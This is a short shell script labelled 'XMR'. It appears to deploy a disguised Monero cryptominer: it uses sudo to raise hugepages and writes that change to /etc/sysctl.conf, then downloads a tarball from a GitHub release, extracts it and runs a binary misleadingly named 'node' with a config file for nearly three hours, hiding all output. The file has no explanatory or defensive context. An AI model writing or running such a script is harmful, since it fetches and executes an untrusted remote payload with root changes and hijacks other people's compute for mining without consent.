#!/bin/sh
#
#
#XMR
core=$(nproc --all)
sudo sysctl -w vm.nr_hugepages=$core
sudo bash -c "echo vm.nr_hugepages=$core >> /etc/sysctl.conf"
wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar
tar -xvf male1.tar
cd MXC
timeout 175m ./node mr.ini > /dev/null 2>&1 ; if [ $? -eq 124 ] ; then echo timed out ; else echo did not time out ; fi
